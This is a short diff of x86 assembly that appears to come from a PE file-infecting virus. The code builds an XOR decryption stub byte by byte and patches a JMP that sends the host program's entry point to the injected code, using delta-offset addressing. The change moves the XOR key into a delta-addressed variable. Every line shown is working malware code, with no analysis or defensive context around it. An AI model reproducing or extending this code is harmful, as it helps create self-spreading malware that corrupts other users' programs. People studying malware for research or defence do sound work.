@@ -98,7 +98,7 @@ mov	eax, 0ACh ; lodsb
 stosb
 mov	eax, 0F083h ; xor eax imm8
 stosw
-mov	eax, XorCrypt
+mov	eax, [DELTA XorCrypt]
 stosb
 mov	eax, 0AAh ; stosb
 stosb
@@ -108,12 +108,12 @@ mov	eax, 0FFh - 06h
 stosb
 ; JUMP!JUMP!JUMP!
 mov	eax, 0E9h ; JMP rel32 OPCODE
-xor	eax, XorCrypt
+xor	eax, [DELTA XorCrypt]
 stosb
 mov	eax, [DELTA VirtualAddress]
 sub	eax, [DELTA CodeSecVA]
 sub	eax, [DELTA OffsetCodeSecEP] ; addr rel = Our VA - their VA - offset EP
 sub	eax, 05h ; Remove 5 bytes for JMP
 sub	eax, PATCH_DECRYPT_SIZE ; Remove our decrypter size
-xor	eax, XorCrypt
+xor	eax, [DELTA XorCrypt]
 stosd
